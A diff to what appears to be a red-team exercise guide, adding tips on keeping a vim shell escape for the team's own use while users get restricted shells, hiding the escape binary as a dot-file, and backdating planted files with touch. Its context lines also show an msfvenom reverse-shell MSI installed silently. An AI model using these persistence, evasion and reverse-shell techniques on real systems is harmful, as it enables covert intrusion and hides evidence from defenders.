@@ -70,6 +70,14 @@ Set users to use restricted shells which limits the commands they are able to ru
 
 &nbsp;&nbsp;&nbsp;&nbsp;<code>root:x:0:0:root:/root:/usr/bin/rsh</code>
 
+If you set all users to have an rshell, anyone that logs in will have an rshell. If you want your defenders to have a normal shell, use a shell escape such as:
+
+&nbsp;&nbsp;&nbsp;&nbsp;<code>vim -c ':!/bin/sh'</code>
+
+more shell escapes here: https://gtfobins.github.io/#+shell
+
+To hide the bin that used for the shell escape, rename it and add the . in the name like ".abc"
+
 ### Using the wall command
 The wall command in linux echos output to all existing shell sessions for any user that is logged in. You can chat this way or you can troll by sending other things like a non-ending feed stream of random characters.
 
@@ -187,3 +195,10 @@ then create an install package:
 &nbsp;&nbsp;&nbsp;&nbsp;<code>msfvenom -p windows/x64/shell_reverse_tcp LHOST=Your_IP LPORT=Your_port -f msi -o shell.msi</code>
 
 &nbsp;&nbsp;&nbsp;&nbsp;<code>msiexec /quiet /qn /i C:\Temp\shell.msi</code>
+
+### Change dates on files
+
+Often when uploading files or modifying existing files, the date stamps can be a clue that this file is out of the ordinary. Use the <code>touch</code> command to hide them.
+
+&nbsp;&nbsp;&nbsp;&nbsp;<code>touch -d "5 January 2021" /.abc</code>
+
